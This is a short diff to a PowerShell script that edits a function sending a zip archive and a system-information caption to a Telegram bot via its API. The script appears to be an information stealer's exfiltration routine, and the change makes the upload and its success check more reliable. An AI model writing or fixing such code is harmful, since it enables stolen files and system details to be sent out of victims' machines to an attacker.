@@ -249,17 +249,17 @@ function Send-ResultToTelegram {
     $caption = Get-Content $SystemInfoPath | Out-String
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     try {
-        $resp = Invoke-WebRequest -Uri $url `
-            -Method Post `
-            -Form @{
-                chat_id = $ChatID
-                caption = $caption
-                document = Get-Item $ZipPath
-            }
-        if ($resp.StatusCode -eq 200) { return $true }
+        $formData = @{
+            chat_id = $ChatID
+            caption = $caption
+            document = Get-Item $ZipPath
+        }
+        $resp = Invoke-RestMethod -Uri $url -Method Post -Form $formData
+        if ($resp.ok -eq $true) { return $true }
         else { return $false }
     } catch { return $false }
 }
+
 
 
 
